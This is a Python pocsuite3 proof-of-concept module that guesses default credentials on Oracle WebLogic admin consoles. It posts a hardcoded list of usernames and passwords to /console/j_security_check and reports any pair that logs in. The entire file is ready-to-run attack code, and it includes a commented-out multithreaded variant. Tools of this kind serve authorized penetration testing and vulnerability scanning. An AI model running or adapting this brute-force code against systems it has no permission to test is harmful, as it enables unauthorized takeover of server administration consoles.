# -*- coding: utf-8 -*-
# author: seven
# 不仅不能多线程 还得加延时
from pocsuite3.api import register_poc, POCBase, Output,logger,POC_CATEGORY,requests
from pocsuite3.lib.core.threads import run_threads
import queue
import itertools
import time

usernames = ['weblogic','oracle','admin']
passwords = ['weblogic','oracle','Oracle@123','123456']

class WeblogicWeakpassPOC(POCBase):
    vulID = ''
    version = '1.0'
    author = ['seven']
    vulDate = 'Aug 11, 2020'
    createDate = 'Aug 11, 2020'
    name = 'weblogic弱口令漏洞'
    appName = 'weblogic'
    appVersion = 'v1.0.0'
    vulType = '弱口令漏洞'
    protocol = 'http'

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    def _verify(self):
        result = {}
        url = self.url
        if not url.startswith('http'):
            url = 'http://'+url
        weblogic_burst(url)
        if not result_queue.empty():
            username,password = result_queue.get()
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Username'] = username
            result['VerifyInfo']['Password'] = password
            result['extra'] = username+':'+password
        return self.parse_output(result)
        
        return self.parse_output(result)
    def _attack(self):
        return self._verify()


task_queue = queue.Queue()
result_queue = queue.Queue()

def get_word_list():
    return itertools.product(usernames,passwords)

def url_check(url):
    try:
        res = requests.get(url+'/console/login/LoginForm.jsp')
        if res.status_code == 200 and 'Weblogic' in res.text:
            return True
    except Exception as e:
        logger.info(str(e))
    logger.info(f'{url} not alive')
    return False

    

def weblogic_login(url,username,password):
    url = url+'/console/j_security_check'
    logger.info('try burst {} use username:{} password:{}'.format(url,username, password))
    try:
        res = requests.post(url,data={
            'j_username':username,
            'j_password':password,
            'j_character_encoding':'UTF-8'
        },allow_redirects=False,verify=False)
        if res.status_code == 302 and 'LoginForm.jsp' not in res.headers.get('Location',''):
            return True
    except Exception as e:
        logger.info(str(e))
        pass
    return False

def weblogic_burst(url):
    if not url_check(url):
        return
    for username,password in get_word_list():
        if weblogic_login(url,username,password):
            result_queue.put((username,password))
            return
        time.sleep(1)
# def task_init(url):
#     for username,password in get_word_list():
#         task_queue.put((url,username.strip(),password.strip()))

# def task_thread():
#     while not task_queue.empty():
#         url,username,password = task_queue.get()
#         logger.info('try burst {} use username:{} password:{}'.format(
#             url,username, password))
#         if weblogic_login(url,username,password):
#             with task_queue.mutex:
#                 task_queue.queue.clear()
#             result_queue.put((username, password))

# def weblogic_burst(url):
#     if not url_check(url):
#         return
#     try:
#         task_init(url)
#         run_threads(2,task_thread)
#     except Exception as e:
#         logger.info(str(e))
#         pass


register_poc(WeblogicWeakpassPOC)